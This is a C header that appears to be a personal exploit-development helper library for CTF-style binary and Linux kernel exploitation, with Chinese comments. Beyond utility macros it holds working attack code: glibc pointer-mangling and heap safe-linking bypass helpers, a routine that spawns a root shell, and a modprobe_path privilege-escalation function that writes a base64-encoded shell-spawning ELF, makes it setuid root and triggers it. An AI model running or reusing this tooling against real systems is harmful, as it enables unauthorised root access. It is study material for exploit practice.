/**
 * demo
 *
 * // 使用各个模块
 * #define DEMO_TEST
 * #define DEMO_KERNEL
 *
 * // 使用全部模块
 * #define DEMO_ALL
 *
 * #include <demo.h>
 */
#ifndef DEMO_H_
#define DEMO_H_

#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <malloc.h>
#include <unistd.h>
#include <assert.h>
#include <signal.h>
#include <stdbool.h>
#include <sys/types.h>
#include <sys/ioctl.h>

#define DEMO_VERSION "demo 1.0.0"

#ifdef DEMO_ALL
#define DEMO_TEST
#define DEMO_KERNEL
#endif // DEMO_ALL

/**
 * 基础数据类型定义
 */
typedef unsigned long long u64;
typedef unsigned int u32;
typedef unsigned short u16;
typedef unsigned char u8;

typedef signed long long s64;
typedef signed int s32;
typedef signed short s16;
typedef signed char s8;

// 输出字体颜色
#define RESET "\x1B[0m"  // 重置为默认颜色
#define _BLK "\x1B[30m"  // 黑色
#define _RED "\x1B[31m"  // 红色
#define _GRN "\x1B[32m"  // 绿色
#define _YEL "\x1B[33m"  // 黄色
#define _BLU "\x1B[34m"  // 蓝色
#define _MAG "\x1B[35m"  // 洋红色
#define _CYN "\x1B[36m"  // 青色
#define _WHT "\x1B[37m"  // 白色
#define _BBLK "\x1B[90m" // 亮黑色
#define _BRED "\x1B[91m" // 亮红色
#define _BGRN "\x1B[92m" // 亮绿色
#define _BYEL "\x1B[93m" // 亮黄色
#define _BBLU "\x1B[94m" // 亮蓝色
#define _BMAG "\x1B[95m" // 亮洋红色
#define _BCYN "\x1B[96m" // 亮青色
#define _BWHT "\x1B[97m" // 亮白色

#define BLK(str) _BLK str RESET   // 黑色
#define RED(str) _RED str RESET   // 红色
#define GRN(str) _GRN str RESET   // 绿色
#define YEL(str) _YEL str RESET   // 黄色
#define BLU(str) _BLU str RESET   // 蓝色
#define MAG(str) _MAG str RESET   // 洋红色
#define CYN(str) _CYN str RESET   // 青色
#define WHT(str) _WHT str RESET   // 白色
#define BBLK(str) _BBLK str RESET // 亮黑色
#define BRED(str) _BRED str RESET // 亮红色
#define BGRN(str) _BGRN str RESET // 亮绿色
#define BYEL(str) _BYEL str RESET // 亮黄色
#define BBLU(str) _BBLU str RESET // 亮蓝色
#define BMAG(str) _BMAG str RESET // 亮洋红色
#define BCYN(str) _BCYN str RESET // 亮青色
#define BWHT(str) _BWHT str RESET // 亮白色

#define ERROR(...) fprintf(stderr, _BRED __VA_ARGS__), fprintf(stderr, RESET);
#define DEBUG(...) fprintf(stdout, __VA_ARGS__)
#define SUCESS(...) fprintf(stdout, _BGRN __VA_ARGS__), fprintf(stdout, RESET);

/**
 * 基础运算赋值
 */
/* 偏移操作 */
#define GET_OFFSET(offset) ((s64)(offset))   // 获取偏移
#define GET_OFFSET32(offset) ((s32)(offset)) // 获取偏移

/* 值操作 */
#define GET_VALUE(value) ((u64)(value))   // 获取值
#define GET_VALUE32(value) ((u32)(value)) // 获取值

#define GET_VALUE_OFFSET(value, offset) GET_VALUE(GET_VALUE(value) + GET_OFFSET(offset))         // 获取带偏移的值
#define GET_VALUE_OFFSET32(value, offset) GET_VALUE32(GET_VALUE32(value) + GET_OFFSET32(offset)) // 获取带偏移的值

#define SET_VALUE(value, data) ((value) = GET_VALUE(data))     // 设置值
#define SET_VALUE32(value, data) ((value) = GET_VALUE32(data)) // 设置值

#define SET_VALUE_OFFSET(value, offset, data) SET_VALUE(value, GET_VALUE_OFFSET(data, offset))       // 设置带偏移的值
#define SET_VALUE_OFFSET32(value, offset, data) SET_VALUE32(value, GET_VALUE_OFFSET32(data, offset)) // 设置带偏移的值

#define PUT_VALUE(str, value) DEBUG("%s : 0x%llX\n", str, GET_VALUE(value))   // 打印值
#define PUT_VALUE32(str, value) DEBUG("%s : 0x%X\n", str, GET_VALUE32(value)) // 打印值

/* 地址操作 */
#define GET_ADDR_VALUE(addr) (*(u64 *)(addr))   // 获取地址的值
#define GET_ADDR_VALUE32(addr) (*(u32 *)(addr)) // 获取地址的值

#define GET_ADDR_OFFSET_VALUE(addr, offset_addr) GET_ADDR_VALUE(GET_VALUE_OFFSET(addr, offset_addr))       // 获取带偏移的地址的值
#define GET_ADDR_OFFSET_VALUE32(addr, offset_addr) GET_ADDR_VALUE32(GET_VALUE_OFFSET32(addr, offset_addr)) // 获取带偏移的地址的值

#define GET_ADDR_VALUE_OFFSET(addr, offset_value) GET_VALUE_OFFSET(GET_ADDR_VALUE(addr), offset_value)       // 获取地址的值带偏移
#define GET_ADDR_VALUE_OFFSET32(addr, offset_value) GET_VALUE_OFFSET32(GET_ADDR_VALUE32(addr), offset_value) // 获取地址的值带偏移

#define GET_ADDR_OFFSET_VALUE_OFFSET(addr, offset_addr, offset_value) GET_VALUE_OFFSET(GET_ADDR_VALUE(GET_VALUE_OFFSET(addr, offset_addr)), offset_value)         // 获取带偏移的地址的值带偏移
#define GET_ADDR_OFFSET_VALUE_OFFSET32(addr, offset_addr, offset_value) GET_VALUE_OFFSET32(GET_ADDR_VALUE32(GET_VALUE_OFFSET32(addr, offset_addr)), offset_value) // 获取带偏移的地址的值带偏移

#define SET_ADDR_VALUE(addr, value) SET_VALUE(GET_ADDR_VALUE(addr), value)       // 设置地址的值
#define SET_ADDR_VALUE32(addr, value) SET_VALUE32(GET_ADDR_VALUE32(addr), value) // 设置地址的值

#define SET_ADDR_OFFSET_VALUE(addr, offset_addr, value) SET_VALUE(GET_ADDR_OFFSET_VALUE(addr, offset_addr), value)       // 设置带偏移的地址的值
#define SET_ADDR_OFFSET_VALUE32(addr, offset_addr, value) SET_VALUE32(GET_ADDR_OFFSET_VALUE32(addr, offset_addr), value) // 设置带偏移的地址的值

#define SET_ADDR_VALUE_OFFSET(addr, value, offset_value) SET_VALUE_OFFSET(GET_ADDR_VALUE(addr), offset_value, value)       // 设置地址的值带偏移
#define SET_ADDR_VALUE_OFFSET32(addr, value, offset_value) SET_VALUE_OFFSET32(GET_ADDR_VALUE32(addr), offset_value, value) // 设置地址的值带偏移

#define SET_ADDR_OFFSET_VALUE_OFFSET(addr, offset_addr, value, offset_value) SET_VALUE_OFFSET(GET_ADDR_OFFSET_VALUE(addr, offset_addr), offset_value, value)       // 设置带偏移的地址的值带偏移
#define SET_ADDR_OFFSET_VALUE_OFFSET32(addr, offset_addr, value, offset_value) SET_VALUE_OFFSET32(GET_ADDR_OFFSET_VALUE32(addr, offset_addr), offset_value, value) // 设置带偏移的地址的值带偏移

#define PUT_ADDR_VALUE(str, addr) DEBUG("%s : 0x%llX\n", str, GET_VALUE(GET_ADDR_VALUE(addr)))     // 打印地址中的值
#define PUT_ADDR_VALUE32(str, addr) DEBUG("%s : 0x%X\n", str, GET_VALUE32(GET_ADDR_VALUE32(addr))) // 打印地址中的值

#define PUT(value) DEBUG("%s : 0x%llX\n", #value, GET_VALUE(value))   // 打印值
#define PUT32(value) DEBUG("%s : 0x%llX\n", #value, GET_VALUE(value)) // 打印值
/**
 * 特殊运算
 */
// 循环右移
#define ROR(x, n) ({                                      \
    u64 _x = (x);                                         \
    u64 _n = (n);                                         \
    __asm__("ror %1, %0" : "=r"(_x) : "cI"(_n), "0"(_x)); \
    _x;                                                   \
})

// 循环左移
#define ROL(x, n) ({                                      \
    u64 _x = (x);                                         \
    u64 _n = (n);                                         \
    __asm__("rol %1, %0" : "=r"(_x) : "cI"(_n), "0"(_x)); \
    _x;                                                   \
})

/**
 * libc加密运算
 */
#define PROTECT_FD(key, value) ((((u64)(key)) >> 12) ^ ((u64)(value))) // ptmalloc中对fd的加密
#define ENC_FD(ptr) PROTECT_FD(&(ptr), ptr)                            // ptmalloc中对fd的解密

#define ENC_PTR1(ptr, pointer_guard, n) (ROL((u64)(ptr) ^ (u64)(pointer_guard), n)) // glibc中对指针的加密
#define DEC_PTR1(ptr, pointer_guard, n) (ROR((u64)(ptr), n) ^ (u64)(pointer_guard)) // glibc中对指针的加密

#define ENC_PTR2(ptr, pointer_guard) ENC_PTR1(ptr, pointer_guard, 0x11) // glibc中对指针的加密
#define DEC_PTR2(ptr, pointer_guard) DEC_PTR1(ptr, pointer_guard, 0x11) // glibc中对指针的加密

/**
 * 其他宏
 */
#define MALLOC(size) (u64) malloc((u64)(size))                                                                                      // 申请内存
#define FREE(ptr) free((void *)(ptr))                                                                                               // 释放内存
#define BINSH 0x68732f6e69622f                                                                                                      // /bin/sh
#define SH 0x3024                                                                                                                   // $0
#define PUT_STRUCT(s, name) printf("%s : 偏移:0x%llX  大小:0x%llX\n", #name, (u64)(&((s *)0)->name), (u64)(sizeof(((s *)0)->name))) // 输出结构体成员的偏移和大小

/**
 * \brief 获取libc基地址
 */
u64 dmGetLibcBase();

/**
 * \brief 初始化标准输入输出错误
 */
void dmInitStd();

/**
 * \brief heap解密
 * \param cipher: fd值
 * \return 解密后的fd值
 */
 long dmDecrypt(long cipher);

#ifdef DEMO_TEST

u64 dmGetLibcBase()
{
    FILE *fp;
    u64 addr = 0;
    char line[256];

    fp = fopen("/proc/self/maps", "r");
    if (fp == NULL)
    {
        perror("无法打开 [/proc/self/maps] 文件");
        return addr;
    }

    while (fgets(line, sizeof(line), fp))
    {
        if (strstr(line, "libc"))
        {
            sscanf(line, "%llx", &addr);
            break;
        }
    }

    fclose(fp);

    if (addr == 0)
        perror("获取libc基地址失败");

    return addr;
}

void dmInitStd()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
}

long dmDecrypt(long cipher)
{
    long key = 0;
    long plain;

    for (int i = 1; i < 6; i++)
    {
        int bits = 64 - 12 * i;
        if (bits < 0)
            bits = 0;
        plain = ((cipher ^ key) >> bits) << bits;
        key = plain >> 12;
    }
    return plain;
}

#endif

#define modprobe_path_fake_value 0x782f706d742f // /tmp/x

/**
 * \brief 提权后调用shell
 */
void dmKernelShell();

/**
 * 用于保存用户态寄存器
 * 切换用户态布置栈
 * swapgs
 * iretq
 * user_shell_addr
 * user_cs
 * user_rflags
 * user_sp
 * user_ss
 */
void dmKernelSaveStatus();

/**
 * \brief 计算offset
 * \param symbol_addr: 符号地址
 * \param symbol_real_addr: 符号真实地址
 * \return 从符号地址到符号真实地址的偏移
 */
s64 dmKernelOffset(u64 symbol_addr, u64 symbol_real_addr);

/**
 * \brief 创建一个假的modprobe文件/tmp/x，并创建异常文件/tmp/err，执行异常文件触发modprobe后会设置/tmp/x的s权限并重新写入x用于获取root
 * \param x: 假的modprobe路径，会自动创建
 * \param err_elf: shell程序路径，会自动创建
 * \note    设置modprobe_path路径为/tmp/x,
 *          然后调用kernel_modprobe_create_fake_modprobe("/tmp/x", "/tmp/err", true);即可获得root权限
 */
void kernel_modprobe_create_fake_modprobe(char *x, char *err_elf, bool run);

#ifdef DEMO_KERNEL

void dmKernelShell()
{
    if (!getuid())
    {
        SUCESS("root success\n");
        system("/bin/sh");
    }
    else
    {
        ERROR("root fail\n");
    }
    exit(0);
}

/**
 * 切换用户态布置栈
 * swapgs
 * iretq
 * user_shell_addr
 * user_cs
 * user_rflags
 * user_sp
 * user_ss
 * 
 * 注意:    在返回用户态执行 system() 函数时同样有可能遇到栈不平衡导致函数执行失败并最终 Segmentation Fault 的问题
 *          因此在本地调试时若遇到此类问题，则可以将 user_sp 的值加减 8 以进行调整。
 */
u64 user_cs, user_rflags, user_sp, user_ss;
void dmKernelSaveStatus()
{
    asm volatile(
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;");
}

s64 dmKernelOffset(u64 symbol_addr, u64 symbol_real_addr)
{
    return (s64)(symbol_real_addr - symbol_addr);
}

void kernel_modprobe_create_fake_modprobe(char *x, char *err_elf, bool run)
{
    char content[0x200] = {0};
    sprintf(content,
            "#!/bin/sh\n"
            "echo 'f0VMRgIBAQMAAAAAAAAAAAIAPgABAAAAyBBAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAACAEAAAAAAAAEAAAAGAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAyAAAAAAAAADIAAAAAAAAAAAQAAAAAAAAAQAAAAUAAADIAAAAAAAAAMgQQAAAAAAAyBBAAAAAAAA4AAAAAAAAADgAAAAAAAAAABAAAAAAAAAvYmluL3NoALAAQAAAAAAAAAAAAAAAAABIMf9IMfa4agAAAA8FSDH/SDH2uHEAAAAPBUiNPcfv//9IjTXI7///SDHAsDsPBbg8AAAAMf8PBQ==' | base64 -d > %s\n"
            "chown 0:0 %s\n"
            "chmod u+s %s\n",
            x, x, x);

    int fd = open(x, O_WRONLY | O_CREAT | O_NOCTTY | O_NONBLOCK, 0755);
    write(fd, content, strlen(content));
    close(fd);

    fd = open(err_elf, O_WRONLY | O_CREAT | O_NOCTTY | O_NONBLOCK, 0755);
    write(fd, "\xff\xff\xff\xff", 4);
    close(fd);

    if (run == true)
    {
        system(err_elf);
        system(x);
    }
}

#endif // DEMO_KERNEL

#endif // DEMO_H_
